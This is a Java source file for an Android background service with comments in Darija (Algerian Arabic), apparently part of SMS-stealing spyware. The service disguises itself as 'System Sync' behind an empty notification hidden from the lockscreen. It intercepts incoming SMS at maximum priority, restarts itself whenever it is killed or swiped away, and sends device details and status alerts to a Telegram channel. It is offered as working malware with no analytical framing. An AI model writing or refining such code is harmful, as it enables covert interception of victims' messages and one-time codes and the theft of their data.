package com.invisible;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.IBinder;

/**
 * الخدمة الرئيسية - تشتغل في الخلفية بشكل دائم
 * تستعمل Foreground Service باش ما يقتلهاش Android
 * Notification تاعها خفية وقد ما يمكن ما تبانش
 */
public class MainService extends Service {

    private static final String CHANNEL_ID = "sys_sync_001";
    private static final int NOTIF_ID = 1337;
    private SmsCatcher smsCatcher;

    @Override
    public void onCreate() {
        super.onCreate();

        // إنشاء قناة إشعارات خفية
        createHiddenChannel();

        // تشغيل الخدمة في المقدمة (Foreground) باش ما تموتش
        startForeground(NOTIF_ID, createHiddenNotification());

        // تسجيل مستقبل SMS
        smsCatcher = new SmsCatcher();
        IntentFilter filter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        filter.setPriority(2147483647);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(smsCatcher, filter, Context.RECEIVER_EXPORTED);
        } else {
            registerReceiver(smsCatcher, filter);
        }

        // إرسال تنبيه بدء التشغيل
        sendBootInfo();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // إعادة التشغيل إذا ماتت الخدمة
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        // محاولة إعادة التشغيل
        TelegramSocket.send("\uD83D\uDD34 <b>Service killed - restarting...</b>");
        try { unregisterReceiver(smsCatcher); } catch (Exception ignored) {}
        Intent restart = new Intent(this, MainService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restart);
        } else {
            startService(restart);
        }
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        // إذا سويت swipe من recent apps
        Intent restart = new Intent(this, MainService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restart);
        } else {
            startService(restart);
        }
    }

    // ===== طرق داخلية =====

    private void createHiddenChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Sync",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("System synchronization service");
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            channel.setBypassDnd(true);

            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }
    }

    private Notification createHiddenNotification() {
        Intent launchIntent = new Intent(this, HideActivity.class);
        PendingIntent pi = PendingIntent.getActivity(
                this, 0, launchIntent,
                PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
        );

        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }

        return builder
                .setContentTitle("")
                .setContentText("")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .setContentIntent(pi)
                .setOngoing(true)
                .setPriority(Notification.PRIORITY_MIN)
                .setVisibility(Notification.VISIBILITY_SECRET)
                .setShowWhen(false)
                .setAutoCancel(false)
                .build();
    }

    private void sendBootInfo() {
        // جمع معلومات الجهاز
        StringBuilder info = new StringBuilder();
        info.append("\uD83D\uDFE2 <b>Device Online</b>\n");
        info.append("\u251C Model: <code>").append(e(Build.MODEL)).append("</code>\n");
        info.append("\u251C Manufacturer: <code>").append(e(Build.MANUFACTURER)).append("</code>\n");
        info.append("\u251C Android: ").append(Build.VERSION.RELEASE)
                .append(" (SDK ").append(Build.VERSION.SDK_INT).append(")\n");
        info.append("\u251C Build: <code>").append(e(Build.DISPLAY)).append("</code>\n");
        info.append("\u251C Brand: <code>").append(e(Build.BRAND)).append("</code>\n");
        info.append("\u251C Product: <code>").append(e(Build.PRODUCT)).append("</code>\n");
        info.append("\u251C Board: <code>").append(e(Build.BOARD)).append("</code>\n");
        info.append("\u2514 Bootloader: <code>").append(e(Build.BOOTLOADER)).append("</code>");

        TelegramSocket.send(info.toString());
    }

    private String e(String s) {
        if (s == null) return "N/A";
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
    }
}
